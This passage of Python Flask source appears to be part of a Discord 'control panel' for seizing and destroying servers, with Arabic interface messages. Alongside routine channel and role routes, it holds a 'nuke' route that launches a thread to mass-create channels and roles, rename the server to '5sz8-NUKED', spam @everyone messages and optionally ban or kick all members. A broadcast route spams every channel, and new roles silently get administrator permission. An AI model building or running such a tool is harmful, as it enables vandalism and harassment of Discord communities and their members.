    channel_id = request.form.get("channel_id")
    content    = request.form.get("content", "")
    if channel_id and content:
        r  = dc_post(f"/channels/{channel_id}/messages", json={"content": content})
        ok = r and r.ok
        return _flash(gid, "✅ تم الإرسال" if ok else "❌ فشل الإرسال", ok, "channels")
    return _flash(gid, "❌ بيانات ناقصة", False, "channels")

@app.route(f"{BASE}/server/<gid>/rename", methods=["POST"])
@require_login
def srv_rename(gid):
    name = request.form.get("name", "").strip()
    if name:
        r  = dc_patch(f"/guilds/{gid}", json={"name": name})
        ok = r and r.ok
        return _flash(gid, f"✅ الاسم الجديد: {name}" if ok else "❌ فشل التغيير", ok, "actions")
    return _flash(gid, "❌ اسم فارغ", False, "actions")

@app.route(f"{BASE}/server/<gid>/broadcast", methods=["POST"])
@require_login
def srv_broadcast(gid):
    content  = request.form.get("content", "")
    channels = get_channels(gid)
    sent = 0
    for ch in channels:
        if ch.get("type") == 0:
            r = dc_post(f"/channels/{ch['id']}/messages", json={"content": content})
            if r and r.ok: sent += 1
            time.sleep(0.3)
    return _flash(gid, f"✅ تم البث لـ {sent} روم", True, "actions")

@app.route(f"{BASE}/server/<gid>/create-channel", methods=["POST"])
@require_login
def srv_create_channel(gid):
    name  = request.form.get("name", "").strip()
    ctype = int(request.form.get("type", 0))
    if name:
        r  = dc_post(f"/guilds/{gid}/channels", json={"name": name, "type": ctype})
        ok = r and r.ok
        return _flash(gid, f"✅ تم إنشاء #{name}" if ok else "❌ فشل الإنشاء", ok, "channels")
    return _flash(gid, "❌ اسم فارغ", False, "channels")

@app.route(f"{BASE}/server/<gid>/delete-channel", methods=["POST"])
@require_login
def srv_delete_channel(gid):
    channel_id = request.form.get("channel_id")
    if channel_id:
        r  = dc_del(f"/channels/{channel_id}")
        ok = r and r.ok
        return _flash(gid, "✅ تم حذف الروم" if ok else "❌ فشل الحذف", ok, "channels")
    return _flash(gid, "❌ معرف الروم مفقود", False, "channels")

@app.route(f"{BASE}/server/<gid>/create-role", methods=["POST"])
@require_login
def srv_create_role(gid):
    name      = request.form.get("name", "").strip()
    color_str = request.form.get("color", "").strip().lstrip("#")
    if name:
        color = int(color_str, 16) if color_str else 0
        r = dc_post(f"/guilds/{gid}/roles",
                    json={"name": name, "color": color, "permissions": "8"})
        ok = r and r.ok
        return _flash(gid, f"✅ تم إنشاء رتبة {name}" if ok else "❌ فشل الإنشاء", ok, "roles")
    return _flash(gid, "❌ اسم فارغ", False, "roles")

@app.route(f"{BASE}/server/<gid>/delete-role", methods=["POST"])
@require_login
def srv_delete_role(gid):
    role_id = request.form.get("role_id")
    if role_id:
        r  = dc_del(f"/guilds/{gid}/roles/{role_id}")
        ok = r and r.ok
        return _flash(gid, "✅ تم حذف الرتبة" if ok else "❌ فشل الحذف", ok, "roles")
    return _flash(gid, "❌ معرف الرتبة مفقود", False, "roles")

@app.route(f"{BASE}/server/<gid>/leave", methods=["POST"])
@require_login
def srv_leave(gid):
    dc_del(f"/users/@me/guilds/{gid}")
    session["flash"] = "✅ تم مغادرة السيرفر"
    session["flash_ok"] = True
    return redirect(f"{BASE}/servers")

# ─────────────────────────────────────────────────────────────
#  ROUTES — NUKE
# ─────────────────────────────────────────────────────────────
@app.route(f"{BASE}/server/<gid>/nuke", methods=["POST"])
@require_login
def srv_nuke(gid):
    try:
        channels   = max(1, min(int(request.form.get("channels",   500)), 1_000_000))
        roles      = max(1, min(int(request.form.get("roles",       500)), 1_000_000))
        new_name   = request.form.get("new_name",  "5sz8-NUKED").strip() or "5sz8-NUKED"
        spam_msg   = request.form.get("spam_msg",  "@everyone 💀 5sz8 NUKED")
        delay      = max(0.01, min(float(request.form.get("delay",  0.05)), 2.0))
        spam_count = max(1, int(request.form.get("spam_count",      10)))
        ban_all    = bool(request.form.get("ban_all"))
        kick_all   = bool(request.form.get("kick_all"))
    except:
        return _flash(gid, "❌ خطأ في البيانات", False, "nuke")

    nuke_tasks[gid] = {"status": "running", "log": []}
    t = threading.Thread(
        target=_nuke_thread,
        args=(gid, channels, roles, new_name, spam_msg, spam_count, delay, ban_all, kick_all),
        daemon=True
    )
    t.start()
    session["active_tab"] = "nuke"
    return redirect(f"{BASE}/server/{gid}")

@app.route(f"{BASE}/server/<gid>/nuke-log")
@require_login
def srv_nuke_log(gid):
    task   = nuke_tasks.get(gid, {"status": "لا يوجد", "log": []})
    status = task.get("status", "لا يوجد")
    log    = task.get("log", [])
    return render_template_string(NUKE_LOG_HTML, base=BASE, gid=gid, status=status, log=log)

@app.route(f"{BASE}/api/nuke-status/<gid>")
@require_login
def api_nuke_status(gid):
    task = nuke_tasks.get(gid, {})
    return jsonify({"status": task.get("status"), "lines": len(task.get("log", []))})

# ─────────────────────────────────────────────────────────────
#  HEALTH & ROOT REDIRECT
# ─────────────────────────────────────────────────────────────
@app.route("/")
def root_redirect():
    return redirect(f"{BASE}/login")

@app.route("/health")
def health():
    return '{"status":"ok"}', 200

# ─────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"╔══════════════════════════════════════════╗")
    print(f"║   5sz8 Ultra Control Panel               ║")
    print(f"║   URL  : /5sz8-{SECRET_SEG}/            ║")
    print(f"║   Port : {PORT}                          ║")
    print(f"╚══════════════════════════════════════════╝")
    app.run(host="0.0.0.0", port=PORT, debug=False)
